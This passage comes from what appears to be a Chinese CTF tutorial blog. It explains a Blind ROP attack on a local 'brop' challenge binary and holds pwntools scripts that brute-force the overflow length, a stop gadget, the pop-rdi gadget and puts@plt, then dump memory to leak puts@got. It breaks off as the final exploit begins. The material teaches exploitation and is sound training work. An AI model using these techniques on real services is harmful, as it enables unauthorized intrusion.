game</span><br></pre></td></tr></table></figure><p>输入一串长字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/CTF$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">hno@hno-virtual-machine:~/Desktop/CTF$ ./brop</span><br><span class="line">WelCome my friend,Do you know password?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>没有显示“No password, no game”，那么就可以通过不断增加字符串长度，并且根据回显结果是否有“No password, no game”来判断什么长度覆盖了返回地址，该长度减一就是栈溢出的长度</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getbufferflow_length</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>) </span><br><span class="line">            <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">            sh.send(i * <span class="string">&#x27;a&#x27;</span>)       <span class="comment">#不断增加a的数量输入到程序中</span></span><br><span class="line">            output = sh.recv() <span class="comment">#将获取到的回显内容放在output变量中</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&#x27;No password&#x27;</span>): </span><br><span class="line">              <span class="comment">#判断output变量中起始位置是不是No password，如果不是说明已经溢出了</span></span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:<span class="comment">#主要探测是否具有canary</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br></pre></td></tr></table></figure><p>代码的逻辑很简单，输入a到程序中，将获取到的回显内容放在output变量中，如果output变量的起始位置不是No password，那么就说明已经溢出了，这时候将a的数量减一即为栈溢出长度，否则就将a的数量加一继续输入到程序中。当发生EOFError异常时，表示可能存在Canary（用于检测缓冲区溢出的机制），这时也会返回栈溢出长度，减一即可。</p><p>在这道题中能够确定栈溢出的长度为72，并且根据返回信息发现没有canary保护</p><h4 id="寻找stop-gadget"><a href="#寻找stop-gadget" class="headerlink" title="寻找stop gadget"></a>寻找stop gadget</h4><p>由于我们不知道程序具体是什么样的，所以需要控制返回地址去猜测gadgets，当我们控制返回地址时，一般会有三种情况：</p><ul><li>程序直接崩溃：ret地址指向的是一个程序内不存在的地址</li><li>程序运行一段时间以后崩溃，比如运行自己构造的函数，该函数的返回地址指向不存在的地址</li><li>程序一直运行而不崩溃</li></ul><p>stop gadget一般指的是，当程序执行这段代码时，程序会进入无限循环，这样就使得攻击者一直保持连接状态，并且程序一直运行不崩溃，stop gadgets最后的ret地址就是程序开始的地址（main、start）</p><p>还是采用穷举的办法不断尝试每一个地址，从初始地址0x400000开始，通过循环不断增加地址进行尝试。</p><p>在执行stop gadget的时候程序会回到初始状态并且没有发生崩溃，那么可以利用这一特性，使用前面找到的72字节填满栈空间，之后接上穷举的地址，由于此时穷举的地址覆盖了ret地址，所以就可以执行穷举的地址，如果此时程序发生崩溃就进行下次循环，如果没有崩溃就将该地址输出。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>(<span class="params">length</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span>     <span class="comment">#尝试起始地址</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload = <span class="string">&#x27;hollkdig&#x27;</span> * length + p64(addr)  <span class="comment">#输入72个字节后面加穷举地址覆盖ret</span></span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recv()    </span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;one success addr: 0x%x&#x27;</span> % (addr)</span><br><span class="line">            <span class="keyword">return</span> addr  <span class="comment">#由于执行代码写在了try中，所以只有程序不崩溃才能走到这一步</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span>   <span class="comment">#如果出现崩溃导致的异常，那么addr+1</span></span><br><span class="line">            sh.close()</span><br><span class="line">            </span><br><span class="line">get_stop_addr(<span class="number">9</span>)  <span class="comment">#传入72个字符串</span></span><br></pre></td></tr></table></figure><p>确定了stop gadget以后就可以为后面查找brop gadget、put plt、puts got做准备，运行后不崩溃的地址会有很多，当查找到第一个不崩溃的地址后可以将0x400000替换为不崩溃的地址，然后去找下一个，节约时间。接下来使用返回到源程序中的地址0x4006B6，该地址为main函数的开始地址，当然正常情况下是看不到的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006B6</span><br><span class="line">.text:00000000004006B6 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004006B6                 public main</span><br><span class="line">.text:00000000004006B6 main            proc near               ; DATA XREF: _start+1Do</span><br><span class="line">.text:00000000004006B6                 push    rbp</span><br><span class="line">.text:00000000004006B7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006BA                 mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">.text:00000000004006C1                 mov     esi, 0          ; buf</span><br><span class="line">.text:00000000004006C6                 mov     rdi, rax        ; stream</span><br></pre></td></tr></table></figure><h4 id="寻找brop-gadget"><a href="#寻找brop-gadget" class="headerlink" title="寻找brop gadget"></a>寻找brop gadget</h4><p>接下来需要找到控制寄存器的gadget，我们的预想是利用put函数泄露出自己的got地址，通过got地址找到对应的libc版本，然后找到system函数和&#x2F;bin&#x2F;sh地址部署到栈中执行，所以我们需要通过gadget来控制寄存器将需要打印的内容放入寄存器内</p><p>在ret2csu中能够知道在<code>libc_csu_init</code>的结尾有一长串pop的gadget，其中是存在<code>pop rdi</code>的，可以利用偏移获取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">-----------------&gt;pop rsi 0x7</span><br><span class="line">-----------------&gt;pop r15</span><br><span class="line">pop     r15</span><br><span class="line">-----------------&gt;ret</span><br><span class="line">-----------------&gt;pop rdi 0x9</span><br><span class="line">-----------------&gt;ret</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>能够看到如果以pop rbx为基地址的话向下偏移0x07会得到<code>pop rsi</code>的操作，向下偏移0x09会得到<code>pop rdi</code>的操作，这两个操作就可以帮助我们控制put函数的输出内容</p><p>既然需要用到<code>pop rdi、pop rsi</code>的操作，那么就需要知道<code>libc_csu_init</code>结尾6个pop操作的位置，这个时候stop gadget就起到作用了，在这里定义栈上的三种地址，以便于演示stop gadget的使用</p><ul><li>Probe<ul><li>探针，也就是我们想要循环递增的代码地址，一般来说都是64位程序，可以直接从0x400000尝试</li></ul></li><li>Stop<ul><li>不会使程序崩溃的stop gadget的地址</li></ul></li><li>Trap<ul><li>可以导致程序崩溃的地址</li></ul></li></ul><p>可以通过在栈上拜访不同程序的stop和trap来识别出正在执行的指令</p><ul><li><p>Probe、Stop、Traps以这样的方式排列，在栈中的排列如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            |&lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          stop             |&lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+</span><br><span class="line">|          probe            |&lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure><p>可以通过程序是否崩溃来判断Probe探针中可能存在的汇编语句，在这样的情况下，如果程序没有崩溃，就说明stop gadget被执行了，<strong>说明probe探针中没有pop 操作，并且有ret返回</strong>，如果有pop操作的话，stop会被pop到寄存器中，那么probe探针的ret返回就会指向stop的后几位traps，那么就会导致程序崩溃，由于在栈布局中的stop gadget在probe的下一位，说明stop所在位置就是probe探针的ret返回地址位置，如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ret</span><br><span class="line">xor eax,eax; ret</span><br></pre></td></tr></table></figure></li><li><p>Probe、Traps、Stop、Traps以这样的方式排列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+</span><br><span class="line">|          trap             | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          probe            | &lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure><p>依旧可以通过程序是否崩溃来判断Probe探针中可能存在的汇编语句，在这样的情况下，如果程序没有崩溃，就说明stop gadget被执行了，<strong>说明probe指针中仅有一个pop操作，并且有ret返回</strong>，在probe中只有一个pop操作的时候才会只将probe后面的trap弹进寄存器，如果有两个及两个以上的pop操作时，stop gagdet也会被弹进寄存器中无法执行，并且在probe探针中ret返回所指的位置是stop才能使程序不崩溃</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop rax; ret</span><br><span class="line">pop rdi; ret</span><br></pre></td></tr></table></figure></li><li><p>probe、trap、trap、trap、trap、trap、trap、stop、traps以这样的方式排列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|           traps           | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+ </span><br><span class="line">|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+ </span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           probe           | &lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure><p>依旧可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样的布局下，如果程序没有崩溃，说明stop gadget被执行了，<strong>说明该probe探针存在6个pop操作，并且有ret</strong>，因为只有在6个pop操作之后的probe后面的trap才能弹进寄存器，之后sp指针才能指向stop gagdet，这个时候stop gadget只有在ret位置才能被执行，因此程序不会崩溃</p></li></ul><p>前面说我们要找的就是<code>libc_csu_init</code>最后的6个pop加ret，那么根据我们前面的分析可以对trap、stop进行排列：</p><p><code>addr, trap, trap, trap, trap, trap, trap, stop, trap</code></p><p>以如上排列，addr通过循环不断增加地址位，只有addr所在地址拥有6个pop操作并ret的时候才会执行stop gadget</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>): <span class="comment">#查找brop gadget函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + p64(h) + p64(o) + p64(l) + p64(l) + p64(k) + p64(<span class="number">0</span>) + p64(stop_gadget) + p64(h) + p64(o) + p64(l) + p64(l) + p64(k) </span><br><span class="line"><span class="comment">#通过72个a填满栈空间到ret，增长的地址覆盖原有的ret地址，接着用6个字符的p64形式充当trap，最后接上stop</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> content</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">&#x27;WelCome&#x27;</span>):</span><br><span class="line">          <span class="comment">#判断提示符是否出现起始提示字符，如果有说明程序没崩溃</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):<span class="comment">#检查地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;,.brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">addr = <span class="number">0x400740</span> </span><br><span class="line"><span class="comment">#理论上应该从0x400000开始寻找，但是这个环节要找的是Libc_csu_init函数，所以大多数的libc中Libc_csu_init函数的起始地址都在0x400740之后，所以为了减少误差，从0x400740开始</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  <span class="comment">#循环递增要测试的地址</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>运行后会得到很多的gadget地址，但是只有<code>0x4007ba</code>是可以进行操作的，可以使用IDA看一下该地址的语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004007BA                 pop     rbx</span><br><span class="line">.text:00000000004007BB                 pop     rbp</span><br><span class="line">.text:00000000004007BC                 pop     r12</span><br><span class="line">.text:00000000004007BE                 pop     r13</span><br><span class="line">.text:00000000004007C0                 pop     r14</span><br><span class="line">.text:00000000004007C2                 pop     r15</span><br><span class="line">.text:00000000004007C4                 retn</span><br></pre></td></tr></table></figure><p>栈中布局：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |        0           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |          .....           |   | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        0           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       stop gadget        | stop gadget作为ret返回地址</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        0           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        k           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        l           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        l           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        o           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        h           | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |         0x400740+         | 递增地址覆盖原ret返回位置</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             a             | a字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br></pre></td></tr></table></figure><p>得到brop gadget后加上<code>0x9</code>的偏移就可以得到<code>pop rdi; ret</code>的操作地址<code>0x4007c3</code></p><h4 id="寻找puts-plt地址"><a href="#寻找puts-plt地址" class="headerlink" title="寻找puts@plt地址"></a>寻找puts@plt地址</h4><p>通过前面的操作可以总结出来一些规律，比如需要什么就把他丢到循环里，通过递增总会得到想要的结果，在上一步我们找到了<code>pop rdi; ret</code>这个gadget地址了，那么我们可以控制puts函数的输出内容，所以需要用这个gadget找到puts_plt的地址。前面说过，想要调用puts函数，必须将puts函数的参数地址先部署到rdi寄存器内，然后调用puts函数将rdi中地址内的参数打印出来</p><p>但是由于开启了NX保护，所以我们无法在栈中部署外部的变量或者字符串，那么就需要一个程序内部的特殊字符串，这个字符串必须是唯一的，在没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为<code>&#39;\x7fELF&#39;</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个A填充栈空间，调用pop rdi；ret gadget将0x400000pop进rdi寄存器，循环增长的地址放在gadget的ret位置，在执行完gadget后直接调用循环增长的地址，如果增长到puts_plt地址就会打印rdi寄存器中地址内存放的字符串，最后的stop gadget是为了让程序不崩溃</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">&#x27;\x7fELF&#x27;</span>):<span class="comment">#判断是否打印\x7fELF</span></span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;find hollkdig puts@plt addr: 0x%x&#x27;</span> % addr</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">rdi_ret = <span class="number">0x4007c3</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br></pre></td></tr></table></figure><p>循环递增地址，找到可以进行打印的put_plt地址，当接收字符串出现<code>&#39;\x7fELF&#39;</code>字样循环终止，为后续找到put_got地址做准备</p><p>最后选择0x400560作为puts_plt的地址，在IDA查看一下（正常情况下看不到）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.plt:0000000000400550                 dq 2 dup(?)</span><br><span class="line">.plt:0000000000400560 ; [00000006 BYTES: COLLAPSED FUNCTION _puts. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:0000000000400566                 dw ?</span><br></pre></td></tr></table></figure><p>栈内的布局</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |       stop gadget        | stop gadget确保程序不崩溃</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       0x400000+        | 循环递增地址，作为pop的ret地址</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |        0x400000        | ELF起始地址，地址内存放&#x27;、x7fELF&#x27;</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |          0x4007c3         | pop rdi；ret地址覆盖原ret返回位置</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             a             | a字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br></pre></td></tr></table></figure><h4 id="泄露puts-got地址"><a href="#泄露puts-got地址" class="headerlink" title="泄露puts_got地址"></a>泄露puts_got地址</h4><p>得到puts_plt地址后，接下来就需要将puts_got地址泄露出来，得到puts_got地址以后就可以利用LibcSearch查找对应的libc版本，再根据版本找到libc中的system函数和&#x2F;bin&#x2F;sh</p><p>PLT表和GOT在前面学习过了，这里就不赘述。在ret2csu中使用的是LibcSearch查找的函数的GOT表地址，由于此题开启了ASLR保护，所以不能使用工具去寻找，那只能手动寻找，其实要找的就是put_plt地址后面存放的jmp指令要跳转的地址。</p><p>手动将整个PLT部分dump下来，dump出来的文件重新设置基地址为0x400000，再根据前面得到的puts_plt地址找到对应位置，查看该地址内的汇编指令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个a填满栈空间至ret位置，后接pop rdi；ret gadget，循环递增的地址被pop进rdi寄存器，接下来将puts_plt地址防止在gadget ret位置进行调用打印循环递增的地址，最后加上stop gadget防止崩溃</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data[:data.index(<span class="string">&quot;\nWelCome&quot;</span>)]<span class="comment">#将接收的\nWelCome之前的字符串交给data变量</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data = data</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>: <span class="comment">#如果data被赋值之后为空，那么就说明已经完成整个dump过程，添加\x00截断</span></span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400560</span></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span> <span class="comment">#准备一个空字符串接收dump出来的代码</span></span><br><span class="line"><span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:   <span class="comment">#从0x400000开始泄露0x1000个字节，足以包含程序的plt部分</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#判断接收字符是否为空</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += data <span class="comment">#接收字符串</span></span><br><span class="line">    addr += <span class="built_in">len</span>(data)  <span class="comment">#addr+接收字符串个数，避免接收重复的字符串</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment">#在当前目录下以二进制形式向hollk文件中写</span></span><br><span class="line">    f.write(result)</span><br></pre></td></tr></table></figure><p>执行后会在本地目录得到一个名为”code“的文件</p><p>dump出来的文件可以看作是windows下脱壳后的文件，实际情况下是看不到二进制文件的，但是dump出来的plt段的内容时可以使用IDA查看的。</p><ul><li><p>在IDA64中，选择<code>binary File</code>形式打开，选择<code>64-bit mode</code></p></li><li><p>给文件设置基地址为0x400000，<code>edit-&gt;segments-&gt;rebase program</code>，改为0x400000即可</p></li><li><p>在之前找到的puts函数的plt的地址为0x400555，找到偏移0x560处，将该地址处的数据转化为汇编指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seg000:000000000040055F                 db    0</span><br><span class="line">seg000:0000000000400560 ; -------------------------------------------------------------</span><br><span class="line">seg000:0000000000400560                 jmp     qword ptr cs:601018h</span><br><span class="line">seg000:0000000000400560 ; -------------------------------------------------------------</span><br><span class="line">seg000:0000000000400566                 db  68h ; h</span><br></pre></td></tr></table></figure><p>puts_got地址为0x601018</p></li></ul><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line"><span class="comment">##brop_gadget = 